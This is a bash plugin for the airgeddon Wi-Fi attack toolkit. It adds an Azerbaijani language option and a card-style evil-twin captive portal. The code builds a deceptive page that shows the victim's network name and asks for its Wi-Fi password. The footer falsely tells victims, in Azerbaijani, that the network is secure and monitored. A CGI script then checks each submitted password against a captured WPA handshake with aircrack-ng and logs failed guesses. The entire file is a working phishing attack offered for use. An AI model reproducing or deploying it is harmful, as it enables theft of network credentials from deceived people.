#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154,SC2148

###### GENERIC PLUGIN VARS ######

plugin_name="airgeddon Azerbaijani captive portal"
plugin_description="Adds an Azerbaijani option to the captive portal language menu and a blue card-style portal page with a generic Wi-Fi logo"
plugin_author="RashadGuluzadeh"

plugin_enabled=1

plugin_minimum_ag_affected_version="10.0"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

###### LANGUAGE STRINGS (added via hookable_for_languages posthook) ######

function airgeddon_portal_posthook_hookable_for_languages() {

	debug_print

	#Azerbaijani captive portal strings
	et_misc_texts["AZERBAIJANI",9]="Wi-Fi şəbəkəsi"
	et_misc_texts["AZERBAIJANI",10]="İnternetə çıxış üçün Wi-Fi şəbəkənizin parolunu daxil edin"
	et_misc_texts["AZERBAIJANI",11]="Parol"
	et_misc_texts["AZERBAIJANI",12]="Parolu göstər"
	et_misc_texts["AZERBAIJANI",13]="Təsdiqlə"
	et_misc_texts["AZERBAIJANI",14]="Gözlənilməz xəta baş verdi, əsas səhifəyə yönləndirilir"
	et_misc_texts["AZERBAIJANI",15]="İnternet Portalı"
	et_misc_texts["AZERBAIJANI",16]="Parol ən azı 8 simvol olmalıdır"
	et_misc_texts["AZERBAIJANI",17]="Parol yanlışdır, əsas səhifəyə yönləndirilir"
	et_misc_texts["AZERBAIJANI",18]="Parol düzgündür, bağlantı bir neçə saniyəyə bərpa olunacaq"
	et_misc_texts["AZERBAIJANI",26]="Xəta. Parol ən azı 8 simvol olmalıdır. Əsas səhifəyə yönləndirilir"

	#Captive portal language menu label (all UI languages)
	arr["ENGLISH",856]="14. Azerbaijani"
	arr["SPANISH",856]="14. Azerbaiyano"
	arr["FRENCH",856]="14. Azerbaïdjanais"
	arr["CATALAN",856]="14. Azerbaidjanès"
	arr["PORTUGUESE",856]="14. Azerbaijano"
	arr["RUSSIAN",856]="14. Азербайджанский"
	arr["GREEK",856]="14. Αζερμπαϊτζανικά"
	arr["ITALIAN",856]="14. Azero"
	arr["POLISH",856]="14. Azerski"
	arr["GERMAN",856]="14. Aserbaidschanisch"
	arr["TURKISH",856]="14. Azerice"
	arr["ARABIC",856]="14. الأذربيجانية"
	arr["CHINESE",856]="14. 阿塞拜疆语"
}

###### OVERRIDE: captive portal language menu (adds Azerbaijani option) ######

function airgeddon_portal_override_set_captive_portal_language() {

	debug_print

	clear
	language_strings "${language}" 293 "title"
	print_iface_selected
	print_et_target_vars
	print_iface_internet_selected
	echo
	language_strings "${language}" 318 "green"
	print_simple_separator
	language_strings "${language}" 266
	print_simple_separator
	language_strings "${language}" 79
	language_strings "${language}" 80
	language_strings "${language}" 113
	language_strings "${language}" 116
	language_strings "${language}" 249
	language_strings "${language}" 308
	language_strings "${language}" 320
	language_strings "${language}" 482
	language_strings "${language}" 58
	language_strings "${language}" 331
	language_strings "${language}" 519
	language_strings "${language}" 687
	language_strings "${language}" 717
	language_strings "${language}" 856
	print_hint

	read -rp "> " captive_portal_language_selected
	echo
	case ${captive_portal_language_selected} in
		0)
			return_to_et_main_menu=1
			return 1
		;;
		1)
			captive_portal_language="ENGLISH"
		;;
		2)
			captive_portal_language="SPANISH"
		;;
		3)
			captive_portal_language="FRENCH"
		;;
		4)
			captive_portal_language="CATALAN"
		;;
		5)
			captive_portal_language="PORTUGUESE"
		;;
		6)
			captive_portal_language="RUSSIAN"
		;;
		7)
			captive_portal_language="GREEK"
		;;
		8)
			captive_portal_language="ITALIAN"
		;;
		9)
			captive_portal_language="POLISH"
		;;
		10)
			captive_portal_language="GERMAN"
		;;
		11)
			captive_portal_language="TURKISH"
		;;
		12)
			captive_portal_language="ARABIC"
		;;
		13)
			captive_portal_language="CHINESE"
		;;
		14)
			captive_portal_language="AZERBAIJANI"
		;;
		*)
			invalid_captive_portal_language_selected
		;;
	esac

	return 0
}

###### OVERRIDE: captive portal page (blue card design + Wi-Fi logo) ######

function airgeddon_portal_override_set_captive_portal_page() {

	debug_print

	{
	echo -e "* {"
	echo -e "\tbox-sizing: border-box;"
	echo -e "\tmargin: 0;"
	echo -e "\tpadding: 0;"
	echo -e "}\n"
	echo -e "body {"
	echo -e "\tfont-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;"
	echo -e "\tmin-height: 100vh;"
	echo -e "\tdisplay: flex;"
	echo -e "\talign-items: center;"
	echo -e "\tjustify-content: center;"
	echo -e "\tpadding: 20px;"
	echo -e "\tbackground: linear-gradient(135deg, #0f172a, ${captive_portal_bg_color});"
	echo -e "\tcolor: #0f172a;"
	echo -e "}\n"
	echo -e ".content {"
	echo -e "\twidth: 100%;"
	echo -e "\tmax-width: 420px;"
	echo -e "\tbackground: #ffffff;"
	echo -e "\tborder-radius: 20px;"
	echo -e "\tbox-shadow: 0 25px 60px rgba(0, 0, 0, .35);"
	echo -e "\toverflow: hidden;"
	echo -e "}\n"
	echo -e ".content center {"
	echo -e "\tdisplay: block;"
	echo -e "\tpadding: 30px 28px;"
	echo -e "\tfont-size: 15px;"
	echo -e "\tline-height: 1.5;"
	echo -e "}\n"
	echo -e ".title {"
	echo -e "\tpadding: 30px 28px 18px;"
	echo -e "\ttext-align: center;"
	echo -e "\tborder-bottom: 1px solid #e2e8f0;"
	echo -e "}\n"
	echo -e ".logo {"
	echo -e "\twidth: 64px;"
	echo -e "\theight: 64px;"
	echo -e "\tmargin: 0 auto 14px;"
	echo -e "\tborder-radius: 16px;"
	echo -e "\tbackground: linear-gradient(135deg, ${captive_portal_button_color}, #06b6d4);"
	echo -e "\tdisplay: flex;"
	echo -e "\talign-items: center;"
	echo -e "\tjustify-content: center;"
	echo -e "}\n"
	echo -e ".logo img {"
	echo -e "\twidth: 36px !important;"
	echo -e "\theight: 36px !important;"
	echo -e "}\n"
	echo -e ".net {"
	echo -e "\tfont-size: 13px;"
	echo -e "\tcolor: #64748b;"
	echo -e "\tletter-spacing: .04em;"
	echo -e "}\n"
	echo -e ".bold {"
	echo -e "\tdisplay: block;"
	echo -e "\tfont-size: 22px;"
	echo -e "\tfont-weight: 700;"
	echo -e "\tmargin-top: 4px;"
	echo -e "\tcolor: #0f172a;"
	echo -e "}\n"
	echo -e ".cardbody {"
	echo -e "\tpadding: 22px 28px 26px;"
	echo -e "}\n"
	echo -e ".sub {"
	echo -e "\tfont-size: 13px;"
	echo -e "\tcolor: #64748b;"
	echo -e "\tline-height: 1.5;"
	echo -e "\tmargin-bottom: 18px;"
	echo -e "}\n"
	echo -e "label {"
	echo -e "\tdisplay: block;"
	echo -e "\tfont-size: 13px;"
	echo -e "\tfont-weight: 600;"
	echo -e "\tmargin-bottom: 6px;"
	echo -e "}\n"
	echo -e "#password {"
	echo -e "\twidth: 100%;"
	echo -e "\tpadding: 13px 14px;"
	echo -e "\tborder: 1.5px solid #e2e8f0;"
	echo -e "\tborder-radius: 12px;"
	echo -e "\tfont-size: 15px;"
	echo -e "\tbackground: #f8fafc;"
	echo -e "}\n"
	echo -e "#password:focus {"
	echo -e "\toutline: none;"
	echo -e "\tborder-color: ${captive_portal_button_color};"
	echo -e "\tbackground: #ffffff;"
	echo -e "\tbox-shadow: 0 0 0 3px ${captive_portal_shadow_color};"
	echo -e "}\n"
	echo -e ".showrow {"
	echo -e "\tdisplay: flex;"
	echo -e "\talign-items: center;"
	echo -e "\tgap: 8px;"
	echo -e "\tmargin: 12px 0 2px;"
	echo -e "\tfont-size: 13px;"
	echo -e "\tcolor: #64748b;"
	echo -e "}\n"
	echo -e "#showpass {"
	echo -e "\twidth: 16px;"
	echo -e "\theight: 16px;"
	echo -e "\taccent-color: ${captive_portal_button_color};"
	echo -e "}\n"
	echo -e ".button {"
	echo -e "\twidth: 100%;"
	echo -e "\tmargin-top: 18px;"
	echo -e "\tpadding: 14px;"
	echo -e "\tborder: none;"
	echo -e "\tborder-radius: 12px;"
	echo -e "\tbackground: ${captive_portal_button_color};"
	echo -e "\tcolor: #ffffff;"
	echo -e "\tfont-size: 15px;"
	echo -e "\tfont-weight: 600;"
	echo -e "\tcursor: pointer;"
	echo -e "}\n"
	echo -e ".lab {"
	echo -e "\tmargin: 0 20px 18px;"
	echo -e "\tbackground: #fffbeb;"
	echo -e "\tborder: 1px solid #fde68a;"
	echo -e "\tborder-radius: 12px;"
	echo -e "\tpadding: 11px 13px;"
	echo -e "\tfont-size: 12px;"
	echo -e "\tcolor: #b45309;"
	echo -e "\tline-height: 1.5;"
	echo -e "}\n"
	echo -e ".foot {"
	echo -e "\tpadding: 0 28px 20px;"
	echo -e "\ttext-align: center;"
	echo -e "\tfont-size: 11.5px;"
	echo -e "\tcolor: #94a3b8;"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${cssfile}"

	{
	echo -e "(function() {\n"
	echo -e "\tvar onLoad = function() {"
	echo -e "\t\tvar password = document.getElementById(\"password\");"
	echo -e "\t\tvar toggle = document.getElementById(\"showpass\");"
	echo -e "\t\tif (password) {"
	echo -e "\t\t\tpassword.oninvalid = function() {"
	echo -e "\t\t\t\tthis.setCustomValidity(\"${et_misc_texts[${captive_portal_language},16]}\");"
	echo -e "\t\t\t};"
	echo -e "\t\t\tpassword.oninput = function() {"
	echo -e "\t\t\t\tthis.setCustomValidity(\"\");"
	echo -e "\t\t\t};"
	echo -e "\t\t}\n"
	echo -e "\t\tif (password && toggle) {"
	echo -e "\t\t\ttoggle.addEventListener(\"click\", function() {"
	echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type === \"text\" ? \"password\" : \"text\");"
	echo -e "\t\t\t});"
	echo -e "\t\t\ttoggle.checked = false;"
	echo -e "\t\t}"
	echo -e "\t};\n"
	echo -e "\tif (document.readyState !== 'loading') onLoad(); else document.addEventListener('DOMContentLoaded', onLoad);"
	echo -e "})();\n"
	echo -e "function redirect() {"
	echo -e "\tdocument.location = \"${indexfile}\";"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${jsfile}"

	{
	echo -e "#!/usr/bin/env bash"
	echo -e "echo '<!DOCTYPE html>'"
	echo -e "echo '<html>'"
	echo -e "echo -e '\t<head>'"
	echo -e "echo -e '\t\t<meta name=\"viewport\" content=\"width=device-width\"/>'"
	echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
	echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
	echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
	echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
	echo -e "echo -e '\t</head>'"
	echo -e "echo -e '\t<body>'"
	echo -e "echo -e '\t\t<img src=\"${pixelfile}\" style=\"display: none;\"/>'"
	echo -e "echo -e '\t\t<div class=\"content\">'"
	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
	echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
	if [ -n "${captive_portal_logo}" ]; then
		echo -e "echo -e '${captive_portal_logo}'"
	fi
	echo -e "echo -e '\t\t\t\t\t<p class=\"net\">${et_misc_texts[${captive_portal_language},9]}</p>'"
	echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid//[\`\']/}</span>'"
	echo -e "echo -e '\t\t\t\t</div>'"
	echo -e "echo -e '\t\t\t\t<div class=\"cardbody\">'"
	echo -e "echo -e '\t\t\t\t\t<p class=\"sub\">${et_misc_texts[${captive_portal_language},10]}</p>'"
	echo -e "echo -e '\t\t\t\t\t<label for=\"password\">${et_misc_texts[${captive_portal_language},11]}</label>'"
	echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[${captive_portal_language},11]}\" pattern=\".{8,}\" required/>'"
	echo -e "echo -e '\t\t\t\t\t<p class=\"showrow\"><input type=\"checkbox\" id=\"showpass\"/> ${et_misc_texts[${captive_portal_language},12]}</p>'"
	echo -e "echo -e '\t\t\t\t\t<button class=\"button\" type=\"submit\">${et_misc_texts[${captive_portal_language},13]}</button>'"
	echo -e "echo -e '\t\t\t\t</div>'"
	echo -e "echo -e '\t\t\t\t<div class=\"foot\">Bu şəbəkə təhlükəsiz və nəzarət altındadır.</div>'"
	echo -e "echo -e '\t\t\t</form>'"
	echo -e "echo -e '\t\t</div>'"
	echo -e "echo -e '\t</body>'"
	echo -e "echo '</html>'"
	echo -e "exit 0"
	} >> "${tmpdir}${webdir}${indexfile}"

	base64 -d <<< "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdj+P///38ACfsD/QVDRcoAAAAASUVORK5CYII=" > "${tmpdir}${webdir}${pixelfile}"

	exec 4>"${tmpdir}${webdir}${checkfile}"

	cat >&4 <<-EOF
		#!/usr/bin/env bash

		echo '<!DOCTYPE html>'
		echo '<html>'
		echo -e '\t<head>'
		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
		echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
		echo -e '\t</head>'
		echo -e '\t<body>'
		echo -e '\t\t<div class="content">'
		echo -e '\t\t\t<center><p>'

		POST_DATA=\$(cat /dev/stdin)
		password=""
		if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
			POST_DATA=\${POST_DATA#*=}
			POST_DATA=\${POST_DATA%%&*}
			for ((i=0; i < \${#POST_DATA}; i++)); do
				character=\${POST_DATA:i:1}
				case "\${character}" in
					"+")
						password+=" "
					;;
					"%")
						hexadecimal=\${POST_DATA:i+1:2}
						if [[ ! "\${hexadecimal}" =~ ^[[:xdigit:]]{2}$ ]] || [[ "\${hexadecimal}" = "00" ]]; then
							password=""
							break
						fi
						printf -v character "%b" "\\x\${hexadecimal}"
						password+="\${character}"
						i=\$((i + 2))
					;;
					*)
						password+="\${character}"
					;;
				esac
			done
			[[ "\${password}" =~ [[:cntrl:]] ]] && password=""
		fi

		if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
			printf "%s\n" "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
			if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
				touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
				echo '${et_misc_texts[${captive_portal_language},18]}'
				et_successful=1
			else
				printf "%s\n" "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
				echo '${et_misc_texts[${captive_portal_language},17]}'
				et_successful=0
			fi
		elif [[ "\${#password}" -gt 0 ]] && [[ "\${#password}" -lt 8 ]]; then
			echo '${et_misc_texts[${captive_portal_language},26]}'
			et_successful=0
		else
			echo '${et_misc_texts[${captive_portal_language},14]}'
			et_successful=0
		fi

		echo -e '\t\t\t</p></center>'
		echo -e '\t\t</div>'
		echo -e '\t</body>'
		echo '</html>'

		if [ "\${et_successful}" -eq 1 ]; then
			exit 0
		else
			echo '<script type="text/javascript">'
			echo -e '\tsetTimeout("redirect()", 3500);'
			echo '</script>'
			exit 1
		fi
	EOF

	exec 4>&-
	sleep 3
}
